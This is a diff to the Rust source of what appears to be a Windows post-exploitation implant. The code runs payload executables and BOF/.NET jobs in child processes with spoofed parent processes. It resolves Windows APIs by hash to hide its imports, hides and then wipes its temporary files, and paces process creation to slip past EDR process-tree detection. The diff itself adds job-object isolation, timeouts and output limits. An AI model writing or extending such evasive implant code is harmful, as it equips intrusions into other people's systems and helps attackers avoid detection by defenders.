@@ -108,11 +108,17 @@ pub async fn run_native_isolated(_pe: &[u8], _args: &str) -> CommandResult {
 
 #[cfg(windows)]
 async fn run_native_job(pe: &[u8], args: &str) -> Result<(String, String), String> {
+    use crate::module_supervisor::{job_object::JobObject, MAX_OUTPUT_BYTES};
+
     tokio::task::yield_now().await;
     crate::utils::opsec_heavy_pace_async().await;
     if pe.len() < 64 || pe[0] != b'M' || pe[1] != b'Z' {
         return Err("payload is not a PE (MZ missing)".into());
     }
+    if pe.len() > crate::module_supervisor::MAX_PAYLOAD_BYTES {
+        return Err("native payload too large".into());
+    }
+
     let path = write_temp_host(pe)?;
     let path_str = path.to_string_lossy().to_string();
     let cmdline = if args.trim().is_empty() {
@@ -120,7 +126,6 @@ async fn run_native_job(pe: &[u8], args: &str) -> Result<(String, String), Strin
     } else {
         format!("\"{}\" {}", path_str, args.trim())
     };
-
     let parent = pick_parent_image();
     let child = match crate::native::spawn::spawn_spoofed_piped_result(&cmdline, parent) {
         Ok(c) => {
@@ -132,28 +137,55 @@ async fn run_native_job(pe: &[u8], args: &str) -> Result<(String, String), Strin
             return Err(format!("spawn failed: {e}"));
         }
     };
-
-    // Native PE: no CIS1 on stdin — close write end so child sees EOF on stdin
+    let job = match JobObject::create() {
+        Some(j) => j,
+        None => {
+            let _ = crate::native::terminate_process_handle(child.h_process);
+            close_child_handles(&child);
+            burn_disk_path(&Some(path));
+            return Err("worker isolation unavailable".into());
+        }
+    };
+    if job.assign_process(child.h_process).is_err() {
+        let _ = crate::native::terminate_process_handle(child.h_process);
+        close_child_handles(&child);
+        burn_disk_path(&Some(path));
+        return Err("worker isolation setup failed".into());
+    }
     let _ = crate::native::close_handle(child.stdin_write);
 
-    // Spawn blocking to avoid stalling the async runtime during long-running native PEs (e.g. fscan)
+    // Bound the read at MAX_OUTPUT_BYTES so we never buffer the full 32 MiB
+    // pipe cap before rejecting. Truncation terminates the worker.
     let stdout_read = child.stdout_read;
-    let h_process = child.h_process;
-    let out_buf = tokio::task::spawn_blocking(move || {
-        let buf = crate::native::pipe_read_to_end(stdout_read);
-        let _ = crate::native::wait_for_single_object(h_process);
-        buf
-    })
-    .await
-    .map_err(|e| format!("spawn blocking failed: {e}"))?;
+    let max_out = MAX_OUTPUT_BYTES;
+    let reader = std::thread::spawn(move || {
+        let buf = crate::native::pipe_read_to_end_bounded(stdout_read, max_out);
+        let truncated = buf.len() >= max_out;
+        (buf, truncated)
+    });
+    let wait_ms = 30_000u32;
+    if !crate::native::wait_for_single_object_timeout(child.h_process, wait_ms) {
+        let _ = job.terminate(1);
+        let _ = crate::native::terminate_process_handle(child.h_process);
+        let _ = reader.join();
+        let _ = crate::native::close_handle(child.h_process);
+        burn_disk_path(&Some(path));
+        return Err("worker timeout".into());
+    }
 
-    let _ = crate::native::close_handle(child.stdout_read);
+    let (out_buf, truncated) = reader
+        .join()
+        .map_err(|_| "worker reader panicked".to_string())?;
+    if truncated {
+        let _ = job.terminate(1);
+        let _ = crate::native::terminate_process_handle(child.h_process);
+        let _ = crate::native::close_handle(child.h_process);
+        burn_disk_path(&Some(path));
+        return Err("worker output too large".into());
+    }
     let _ = crate::native::close_handle(child.h_process);
+    burn_disk_path(&Some(path));
 
-    let _ = std::fs::write(&path, b"");
-    let _ = std::fs::remove_file(&path);
-
-    // Hybrid decode for GBK console tools like fscan
     let text = {
         #[cfg(feature = "encoding-support")]
         {
@@ -173,20 +205,59 @@ async fn run_native_job(pe: &[u8], args: &str) -> Result<(String, String), Strin
 }
 
 #[cfg(windows)]
-async fn run_job(kind: u32, payload: &[u8], args: &[u8]) -> Result<(String, String), String> {
-    // Yield so async callers don't block the runtime exclusively forever
-    tokio::task::yield_now().await;
-    // Avoid back-to-back BOF/.NET process-create bursts (EDR process tree heuristics)
-    crate::utils::opsec_heavy_pace_async().await;
+fn close_child_handles(child: &crate::native::spawn::SpoofedPipedChild) {
+    let _ = crate::native::close_handle(child.stdin_write);
+    let _ = crate::native::close_handle(child.stdout_read);
+    let _ = crate::native::close_handle(child.h_process);
+}
 
+#[cfg(windows)]
+async fn run_job(kind: u32, payload: &[u8], args: &[u8]) -> Result<(String, String), String> {
+    use crate::module_supervisor::{MAX_OUTPUT_BYTES, MAX_PAYLOAD_BYTES};
+
+    if payload.len() > MAX_PAYLOAD_BYTES || args.len() > MAX_PAYLOAD_BYTES {
+        return Err("worker payload too large".into());
+    }
+    let deadline_ms = 30_000u64;
+    let payload = payload.to_vec();
+    let args = args.to_vec();
+
+    // All Win32 pipe operations run off the async executor. The timeout path
+    // owns the process handles and terminates the Job Object before returning.
+    tokio::task::spawn_blocking(move || {
+        run_job_blocking(kind, &payload, &args, deadline_ms, MAX_OUTPUT_BYTES)
+    })
+    .await
+    .map_err(|e| format!("worker thread: {e}"))?
+}
+
+#[cfg(windows)]
+fn run_job_blocking(
+    kind: u32,
+    payload: &[u8],
+    args: &[u8],
+    deadline_ms: u64,
+    max_output: usize,
+) -> Result<(String, String), String> {
+    use crate::module_supervisor::job_object::JobObject;
+
+    crate::utils::opsec_heavy_pace();
     let pe = resolve_iso_host_pe()?;
     let parent = pick_parent_image();
-
-    // Prefer true zero-residual host (section / delete-on-close). Fall back to classic temp.
     let (child, disk_path) = spawn_isolated_host(&pe, parent)?;
-    info!("[iso] host pid={}", child.pid);
+    let job = JobObject::create().ok_or_else(|| {
+        let _ = crate::native::terminate_process_handle(child.h_process);
+        "worker isolation unavailable".to_string()
+    })?;
+    if job.assign_process(child.h_process).is_err() {
+        let _ = crate::native::terminate_process_handle(child.h_process);
+        let _ = crate::native::close_handle(child.stdin_write);
+        let _ = crate::native::close_handle(child.stdout_read);
+        let _ = crate::native::close_handle(child.h_process);
+        burn_disk_path(&disk_path);
+        return Err("worker isolation setup failed".into());
+    }
 
-    // Job frame: seed-derived magic + kind + lens + body (payload never written as a file)
     let mut frame = Vec::with_capacity(16 + payload.len() + args.len());
     frame.extend_from_slice(&JOB_MAGIC);
     frame.extend_from_slice(&kind.to_le_bytes());
@@ -194,48 +265,41 @@ async fn run_job(kind: u32, payload: &[u8], args: &[u8]) -> Result<(String, Stri
     frame.extend_from_slice(&(args.len() as u32).to_le_bytes());
     frame.extend_from_slice(payload);
     frame.extend_from_slice(args);
-
-    let write_res = crate::native::pipe_write_all(child.stdin_write, &frame);
+    crate::native::pipe_write_all(child.stdin_write, &frame)?;
     let _ = crate::native::close_handle(child.stdin_write);
-    if let Err(e) = write_res {
-        let _ = crate::native::close_handle(child.stdout_read);
-        let _ = crate::native::close_handle(child.h_process);
-        burn_disk_path(&disk_path);
-        return Err(e);
-    }
 
-    // Read result header
-    let hdr = match crate::native::pipe_read_exact(child.stdout_read, 8) {
-        Ok(h) => h,
-        Err(e) => {
-            let _ = crate::native::close_handle(child.stdout_read);
-            let _ = crate::native::wait_for_single_object(child.h_process);
-            let _ = crate::native::close_handle(child.h_process);
-            burn_disk_path(&disk_path);
-            return Err(e);
+    let stdout_handle = child.stdout_read;
+    let reader = std::thread::spawn(move || -> Result<(Vec<u8>, Vec<u8>), String> {
+        let hdr = crate::native::pipe_read_exact(stdout_handle, 8)?;
+        let out_len = u32::from_le_bytes(hdr[0..4].try_into().unwrap()) as usize;
+        let err_len = u32::from_le_bytes(hdr[4..8].try_into().unwrap()) as usize;
+        if out_len > max_output || err_len > max_output {
+            return Err("worker output too large".into());
         }
-    };
-    let out_len = u32::from_le_bytes([hdr[0], hdr[1], hdr[2], hdr[3]]) as usize;
-    let err_len = u32::from_le_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]) as usize;
-    if out_len > 32 * 1024 * 1024 || err_len > 8 * 1024 * 1024 {
-        let _ = crate::native::close_handle(child.stdout_read);
+        let out = crate::native::pipe_read_exact(stdout_handle, out_len)?;
+        let err = crate::native::pipe_read_exact(stdout_handle, err_len)?;
+        let _ = crate::native::close_handle(stdout_handle);
+        Ok((out, err))
+    });
+
+    let wait_ms = deadline_ms.clamp(1_000, 300_000) as u32;
+    if !crate::native::wait_for_single_object_timeout(child.h_process, wait_ms) {
+        let _ = job.terminate(1);
+        let _ = crate::native::terminate_process_handle(child.h_process);
         let _ = crate::native::close_handle(child.h_process);
+        let _ = reader.join();
         burn_disk_path(&disk_path);
-        return Err("result too large".into());
+        return Err("worker timeout".into());
     }
-    let out_b = crate::native::pipe_read_exact(child.stdout_read, out_len).unwrap_or_default();
-    let err_b = crate::native::pipe_read_exact(child.stdout_read, err_len).unwrap_or_default();
-    let _ = crate::native::close_handle(child.stdout_read);
 
-    // Wait exit (short timeout via WaitForSingleObject - use native wait)
-    let _ = crate::native::wait_for_single_object(child.h_process);
+    let result = reader
+        .join()
+        .map_err(|_| "worker reader panicked".to_string())??;
     let _ = crate::native::close_handle(child.h_process);
-
     burn_disk_path(&disk_path);
-
     Ok((
-        String::from_utf8_lossy(&out_b).into_owned(),
-        String::from_utf8_lossy(&err_b).into_owned(),
+        String::from_utf8_lossy(&result.0).into_owned(),
+        String::from_utf8_lossy(&result.1).into_owned(),
     ))
 }
 
@@ -287,6 +351,18 @@ fn pick_parent_image() -> &'static str {
     POOL[i]
 }
 
+/// Public for ModuleSupervisor parent spoof pool.
+pub fn pick_parent_for_supervisor() -> &'static str {
+    #[cfg(windows)]
+    {
+        pick_parent_image()
+    }
+    #[cfg(not(windows))]
+    {
+        ""
+    }
+}
+
 fn resolve_iso_host_pe() -> Result<Vec<u8>, String> {
     // 1) Staged as module payload (not LoadLibrary — host PE)
     #[cfg(feature = "module-loader")]
@@ -336,10 +412,12 @@ fn write_temp_host(pe: &[u8]) -> Result<PathBuf, String> {
         unsafe {
             // FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY = 0x2 | 0x100
             type SetFileAttributesWFn = unsafe extern "system" fn(*const u16, u32) -> i32;
-            let k32 = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
-            if let Some(addr) =
-                crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"SetFileAttributesW"))
-            {
+            let k32 =
+                crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
+            if let Some(addr) = crate::stealth::get_api_addr(
+                k32,
+                crate::stealth::hash_api_name(b"SetFileAttributesW"),
+            ) {
                 let f: SetFileAttributesWFn = std::mem::transmute(addr);
                 let _ = f(wide.as_ptr(), 0x0000_0102);
             }
